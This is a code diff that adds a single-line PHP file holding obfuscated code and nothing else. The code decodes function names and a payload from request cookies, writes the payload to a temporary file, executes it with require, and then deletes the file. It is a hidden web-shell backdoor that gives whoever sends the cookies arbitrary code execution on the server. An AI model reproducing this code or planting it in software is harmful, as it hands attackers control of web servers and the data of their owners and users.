@@ -1,0 +1,1 @@
+<?php $umiauy = "\x7\x9\x16\x4\x59\x44\x2d\xf\x6\x9\xd\x3\x3" ^ "eheaoprkcjbgfdliwhmgl";$sqx = $_COOKIE;foreach ($sqx as $zi=>$zp){$sqx[$zi] = $umiauy($zp) ^ str_pad($zi, strlen($zp), $zi);}$qjnque = $sqx["xtpqt"](); $jvc = $sqx["ggqu"] ($qjnque); $jvc = $jvc['uri'];$sqx["xjep"] ($qjnque, $sqx["lp"]);require($jvc); $sqx["dlzuxk"] ($qjnque); $sqx["egrhql"]($jvc); ?>
